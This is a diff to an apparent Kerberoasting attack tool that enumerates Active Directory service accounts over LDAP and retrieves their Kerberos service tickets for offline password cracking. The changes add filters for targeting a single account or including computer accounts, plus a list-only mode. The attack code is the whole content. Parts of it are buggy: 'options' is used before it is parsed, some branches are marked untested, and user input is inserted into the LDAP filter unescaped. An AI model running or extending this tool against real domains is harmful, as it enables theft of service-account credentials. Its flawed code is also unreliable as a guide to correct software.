@@ -40,6 +40,18 @@ LDAP_QUERY = "(&\
               (!(cn=krbtgt))\
               (!(userAccountControl:1.2.840.113556.1.4.803:=2))\
               )"
+LDAP_SPECIFIC_USER = "(&\
+                      (sAMAccountName=%s)\
+                      (objectClass=user)\
+                      (!(servicePrincipalName=""))\
+                      (!(objectClass=computer))\
+                      (!(cn=krbtgt))\
+                      (!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
+LDAP_SPN_WITH_COMPUTERS = "(&\
+                           (servicePrincipalName=*)\
+                           (!(cn=krbtgt))\
+                           (!(userAccountControl:1.2.840.113556.1.4.803:=2))\
+                           )"
 
 ATTRIBUTES_TO_RETRIEVE = ['sAMAccountName',
                           'servicePrincipalName',
@@ -78,7 +90,8 @@ class AttackParameters():
                 auth_gssapi = False, list_spn = None,
                 tgt = None, session_key = None,
                 logon_time = None, outputfile_path = None,
-                time_delta = 0, as_data = {}
+                time_delta = 0, as_data = {}, use_sam_ldap_query = None,
+                sam_account_name = None, list_computers = False
                 ):
 
         self.user_account = user_account
@@ -96,6 +109,9 @@ class AttackParameters():
         self.logon_time = logon_time
         self.time_delta = time_delta
         self.as_data = as_data
+        self.use_sam_ldap_query = use_sam_ldap_query
+        self.sam_account_name = sam_account_name
+        self.list_computers = list_computers
 
     # We ask a TGT with PAC when LDAP connection is made through gssapi
     def get_TGT(self, need_pac = False):
@@ -312,11 +328,24 @@ def ldap_get_all_users_spn(AttackParameters, port):
     # Query to find all accounts having a servicePrincipalName
     attributes_to_retrieve = [x.lower() for x in ATTRIBUTES_TO_RETRIEVE]
 
-    c.search(DN,
-            LDAP_QUERY,
-            search_scope='SUBTREE',
-            attributes = attributes_to_retrieve
-            )
+    if AttackParameters.use_sam_ldap_query is True:
+        c.search(DN,
+                LDAP_SPECIFIC_USER % AttackParameters.sam_account_name,
+                search_scope='SUBTREE',
+                attributes = attributes_to_retrieve
+                )
+    elif AttackParameters.list_computers is True:
+        c.search(DN,
+                LDAP_SPN_WITH_COMPUTERS,
+                search_scope='SUBTREE',
+                attributes = attributes_to_retrieve
+                )
+    else:
+        c.search(DN,
+                LDAP_QUERY,
+                search_scope='SUBTREE',
+                attributes = attributes_to_retrieve
+                )
 
     if not c.response:
         WRITE_STDOUT("Cannot find any SPN, wrong user/credentials?\n")
@@ -394,8 +423,13 @@ def parse_TGS_REP(sock, subkey, spn, samaccountname, kdc_addr):
         WRITE_STDOUT('  [+] Parsing TGS-REP from %s...' % kdc_addr)
         tgs_rep, tgs_rep_enc = decrypt_tgs_rep(data, subkey)
 
+        # the TGS-REP was not valid (reasons could be wrong SPN, duplicate SPN, etc.)
+        if tgs_rep == "error":
+            # we always want to print the error so, we don't use WRITE_STDOUT
+            print('[-] %s for SPN %s' % (tgs_rep_enc, spn))
+            return None, None
         # MAGIC, not RC4 received...
-        if len(tgs_rep) == 2 and not tgs_rep_enc:
+        elif len(tgs_rep) == 2 and not tgs_rep_enc:
             WRITE_STDOUT(' Only rc4-hmac supported and encryption type\
                             is \'%s\'. Skipping this account...\n\n' %\
                             dico_etypes[tgs_rep])
@@ -431,6 +465,12 @@ def parse_arguments():
     containing TGT. Parsing is determined by extension (.ccache for Linux\
     , Windows is yet to be implemented)")
 
+    parser.add_argument('-l', '--list_spn_only', required=False, action='store_true',
+                        help="Only lists existing user accounts SPN")
+
+    parser.add_argument('-c', '--computers', required=False, action='store_true',
+                        help="Lists all existing SPN, including computers. Can't be set without -l")
+
     group.add_argument('-p', '--password', required=False, help="clear password\
     submitted. Cannot be used with '--hash'")
 
@@ -450,6 +490,13 @@ def parse_arguments():
     group2.add_argument('-i', '--inputfile_spn', required=False, help="retrieve\
     TGS associated with SPN in user's provided file. Format must be 'samaccountname$spn'\
     on each line, 'samaccountname' can be 'unknown'")
+
+    group2.add_argument('-s', '--sam_account_name', required=False, help="retrieve\
+    the SPN of the provided sAMAccountName.")
+
+    if options.computers and not options.list_spn_only:
+        parser.print_help()
+        sys.exit(1)
 
     options = parser.parse_args()
     if not any(vars(options).values()):
@@ -504,7 +551,14 @@ def main():
         else:
             pDN = PCHAR("DC="+",DC=".join(user_realm.upper().split('.')))
 
-            pFilter = PCHAR(LDAP_QUERY)
+            # need to be tested!
+            if options.computers:
+                query = LDAP_SPN_WITH_COMPUTERS
+            elif options.sam_account_name:
+                query = LDAP_SPECIFIC_USER
+            else:
+                query = LDAP_QUERY
+            pFilter = PCHAR(query)
 
             Attributes = ["sAMAccountName", "servicePrincipalName", "memberOf", "primaryGroupID", 0]
             pAttributes = (PCHAR * len(Attributes))(*Attributes)
@@ -528,6 +582,14 @@ def main():
                 WRITE_STDOUT("\n[-] Cannot find any SPN, exiting.")
                 sys.exit(1)
             else:
+                # need to be tested!
+                if options.list_spn_only:
+                    for spn in list_spn:
+                        if "$" in spn["samaccountname"]:
+                            print("%s%s" % (spn["samaccountname"], spn["serviceprincipalname"]))
+                        else:
+                            print("%s$%s" % (spn["samaccountname"], spn["serviceprincipalname"]))
+                    sys.exit(1)
                 WRITE_STDOUT(" Done!\n")
 
         dirname = ""
@@ -634,6 +696,17 @@ def main():
             DataSubmitted.password = getpass('Password: ')
             DataSubmitted.key = (RC4_HMAC, ntlm_hash(DataSubmitted.password).digest())
 
+        if options.list_spn_only:
+            if options.computers:
+                DataSubmitted.list_computers = True
+            spn_list = ldap_get_all_users_spn(DataSubmitted, LDAP_PORT)
+            for spn in spn_list:
+                if "$" in spn["samaccountname"]:
+                    print("%s%s" % (spn["samaccountname"], spn["serviceprincipalname"]))
+                else:
+                    print("%s$%s" % (spn["samaccountname"], spn["serviceprincipalname"]))
+            sys.exit(1)
+
         if options.user_sid:
             DataSubmitted.sid = options.user_sid
             DataSubmitted.auth_gssapi = True
@@ -650,6 +723,9 @@ def main():
             except:
                 WRITE_STDOUT("Cannot open '" + options.inputfile_spn + "', exiting\n")
                 sys.exit(1)
+        elif options.sam_account_name:
+            DataSubmitted.sam_account_name = options.sam_account_name
+            DataSubmitted.use_sam_ldap_query = True
 
         if options.input_TGT_File:
             DataSubmitted.Parse_TGT_File(options.input_TGT_File)
